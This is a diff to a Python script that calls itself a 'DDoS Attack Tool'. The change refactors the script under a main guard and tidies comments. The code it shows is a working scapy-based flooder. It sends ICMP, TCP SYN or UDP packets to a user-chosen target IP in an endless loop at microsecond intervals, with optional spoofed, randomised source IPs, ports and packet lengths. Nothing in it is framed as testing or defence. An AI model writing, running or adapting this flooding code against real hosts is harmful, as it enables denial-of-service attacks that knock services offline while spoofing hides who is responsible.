@@ -25,6 +25,9 @@ destination_port = -1
 global pkt_len
 pkt_len = 0
 
+global spoof_ip
+spoof_ip = 0
+
 # Check IPv4 format
 def validate_ip_address(address):
    parts = address.split(".")
@@ -143,8 +146,7 @@ def set_pkt_len(is_random_pkt_len):
 
    return pkt_len, is_random_pkt_len
 
-# i = 1
-
+# Set random IP address
 def rand_ip():
    a = str(random.randint(1,254))
    b = str(random.randint(1,254))
@@ -156,11 +158,13 @@ def rand_ip():
    
    return rip
 
+# Set random port number
 def rand_port():
    rport = random.randint(0,65535)
 
    return rport
 
+# Send packet with specific parameters
 def send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len):
    if ip_proto != 0:
       if is_random_src_port == True:
@@ -188,155 +192,117 @@ def send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random
       send(pkt, inter = .000001)
       return
 
-print("\n\n")
-print("----------------------------------------------------------------")
-print("----------------------------------------------------------------")
-print("----------------------------------------------------------------")
-print("-------------------Welcome to DDoS Attack Tool------------------")
-print("----------------------Written by TuanNQ-VCS---------------------")
-print("----------------------------------------------------------------")
-print("----------------------------------------------------------------")
-print("----------------------------------------------------------------")
-print("\nDo you want to spoof source IP address?")
-print("Please choose:")
-print("\t0: No")
-print("\t1: Yes\n")
+if __name__ == '__main__':
+   print("\n\n")
+   print("----------------------------------------------------------------")
+   print("----------------------------------------------------------------")
+   print("----------------------------------------------------------------")
+   print("-------------------Welcome to DDoS Attack Tool------------------")
+   print("----------------------Written by TuanNQ-VCS---------------------")
+   print("----------------------------------------------------------------")
+   print("----------------------------------------------------------------")
+   print("----------------------------------------------------------------")
+   print("\nDo you want to spoof source IP address?")
+   print("Please choose:")
+   print("\t0: No")
+   print("\t1: Yes\n")
 
-global spoof_ip
-spoof_ip = 0
-while True:
-   spoof_ip = input("--> You press: ")
-   if (spoof_ip.isdigit() == False or (int(spoof_ip) != 0 and int(spoof_ip) != 1)):
-      print("Please choose either 0 or 1!")
-      
-   else:
-      spoof_ip = int(spoof_ip)
-      break
+   while True:
+      spoof_ip = input("--> You press: ")
+      if (spoof_ip.isdigit() == False or (int(spoof_ip) != 0 and int(spoof_ip) != 1)):
+         print("Please choose either 0 or 1!")
+         
+      else:
+         spoof_ip = int(spoof_ip)
+         break
 
-source_ip, is_random_ip = set_source_ip(int(spoof_ip))
-target_ip = set_target_IP()
+   source_ip, is_random_ip = set_source_ip(int(spoof_ip))
+   target_ip = set_target_IP()
 
-print("\nPlease choose protocol:")
-print("    0: ICMP")
-print("    1: TCP")
-print("    2: UDP\n")
+   print("\nPlease choose protocol:")
+   print("    0: ICMP")
+   print("    1: TCP")
+   print("    2: UDP\n")
 
-ip_proto = 0
-tcp_flag = 'S'
-while True:
-   ip_proto = input("--> You press: ")
-   if (ip_proto.isdigit() == False or (int(ip_proto) != 0 and int(ip_proto) != 1 and int(ip_proto) != 2)):
-      print("Please choose either 0 or 1 or 2!")
-      
-   else:
-      ip_proto = int(ip_proto)
-      break
+   ip_proto = 0
+   while True:
+      ip_proto = input("--> You press: ")
+      if (ip_proto.isdigit() == False or (int(ip_proto) != 0 and int(ip_proto) != 1 and int(ip_proto) != 2)):
+         print("Please choose either 0 or 1 or 2!")
+         
+      else:
+         ip_proto = int(ip_proto)
+         break
 
-if (ip_proto != 0):
-   # global source_port
-   source_port, is_random_src_port = set_source_port(is_random_src_port)
-   # global destination_port
-   destination_port, is_random_dst_port = set_destination_port(is_random_dst_port)
-   pkt_len, is_random_pkt_len = set_pkt_len(is_random_pkt_len)
+   if (ip_proto != 0):
+      source_port, is_random_src_port = set_source_port(is_random_src_port)
+      destination_port, is_random_dst_port = set_destination_port(is_random_dst_port)
+      pkt_len, is_random_pkt_len = set_pkt_len(is_random_pkt_len)
 
-print("\n\t############Summary############")
-if spoof_ip == 1:
-   if is_random_ip == True:
-      print("\tSource IP address: Random")
-   else: 
-      print("\tSource IP address: {}".format(source_ip))
-else:
-   print("\tSource IP address: Default local")
-
-print("\tTarget IP address: {}".format(target_ip))
-
-if is_random_src_port == True:
-   print("\tSource Port Number: Random")
-else:
-   if source_port == -1:
-      print("\tSource Port Number: None")
-   else:
-      print("\tSource Port Number: {}".format(source_port))
-
-if is_random_dst_port == True:
-   print("\tTarget Port Number: Random")
-else:
-   if destination_port == -1:
-      print("\tDestination Port Number: None")
-   else:
-      print("\tDestination Port Number: {}".format(destination_port))
-
-if ip_proto == 0:
-   print("\tProtocol: ICMP")
-if ip_proto == 1:
-   print("\tProtocol: TCP")
-   print("\tFlag: SYN")
-if ip_proto == 2:
-   print("\tProtocol: UDP")
-
-if ip_proto != 0:
-   if is_random_pkt_len == True:
-      print("\tPacket Length: Random")
-   else:
-      print("\tPacket length: {}".format(pkt_len))
-
-print("\t###############################\n")
-
-while True:
-   ack = input("\nDo you want to attack (y/n): ")
-   ack = str(ack)
-   if (ack != 'y' and ack != 'n'):
-      print("Please choose y (yes) or n (no)!")
-      continue
-   if ack == 'y':
-      break
-   if ack == 'n':
-      exit()
-
-print("\nStarting attack...")
-time.sleep(1)
-
-while True:
-   # source_ip = rand_ip()
-   # source_port = rand_port()
-
+   print("\n\t############Summary############")
    if spoof_ip == 1:
       if is_random_ip == True:
-         source_ip = rand_ip()
-      IP1 = IP(src = source_ip, dst = target_ip)
-      send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
+         print("\tSource IP address: Random")
+      else: 
+         print("\tSource IP address: {}".format(source_ip))
    else:
-      IP1 = IP(dst = target_ip)
-      send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
+      print("\tSource IP address: Default local")
 
-   # global pkt
-   # pkt = IP1 / ICMP()
+   print("\tTarget IP address: {}".format(target_ip))
 
-   # if ip_proto != 0:
-   #    if is_random_src_port == True:
-   #       source_port = rand_port()
-      
-   #    if is_random_dst_port == True:
-   #       destination_port = rand_port()
+   if is_random_src_port == True:
+      print("\tSource Port Number: Random")
+   else:
+      if source_port == -1:
+         print("\tSource Port Number: None")
+      else:
+         print("\tSource Port Number: {}".format(source_port))
 
-   #    if ip_proto == 1:
-   #       TCP1 = TCP(sport = source_port, dport = destination_port)
-   #       pkt = IP1 / TCP1
-   #       send(pkt, inter = .00001)
+   if is_random_dst_port == True:
+      print("\tTarget Port Number: Random")
+   else:
+      if destination_port == -1:
+         print("\tDestination Port Number: None")
+      else:
+         print("\tDestination Port Number: {}".format(destination_port))
 
-   #    if ip_proto == 2:
-   #       UDP1 = UDP(sport = source_port, dport = destination_port)
-   #       pkt = IP1 / UDP1
-   #       send(pkt, inter = .00001)
-   # else:
-   #    pkt = IP1 / ICMP()
-   #    send(pkt, inter = .00001)
-   
-   # TCP1 = TCP(sport = source_port, dport = 80)
-   # UDP1 = UDP(sport = source_port, dport = destination_port)
-   # pkt = IP1 / TCP1
-   # pkt = IP1 / UDP1
-   # pkt = IP1 / ICMP()
-   # send(pkt, inter = .00001)
-   # print ("packet sent ", i)
-   # i = i + 1
+   if ip_proto == 0:
+      print("\tProtocol: ICMP")
+   if ip_proto == 1:
+      print("\tProtocol: TCP")
+      print("\tFlag: SYN")
+   if ip_proto == 2:
+      print("\tProtocol: UDP")
+
+   if ip_proto != 0:
+      if is_random_pkt_len == True:
+         print("\tPacket Length: Random")
+      else:
+         print("\tPacket length: {}".format(pkt_len))
+
+   print("\t###############################\n")
+
+   while True:
+      ack = input("\nDo you want to attack (y/n): ")
+      ack = str(ack)
+      if (ack != 'y' and ack != 'n'):
+         print("Please choose y (yes) or n (no)!")
+         continue
+      if ack == 'y':
+         break
+      if ack == 'n':
+         exit()
+
+   print("\nStarting attack...")
+   time.sleep(1)
+
+   while True:
+      if spoof_ip == 1:
+         if is_random_ip == True:
+            source_ip = rand_ip()
+         IP1 = IP(src = source_ip, dst = target_ip)
+         send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
+      else:
+         IP1 = IP(dst = target_ip)
+         send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
+         
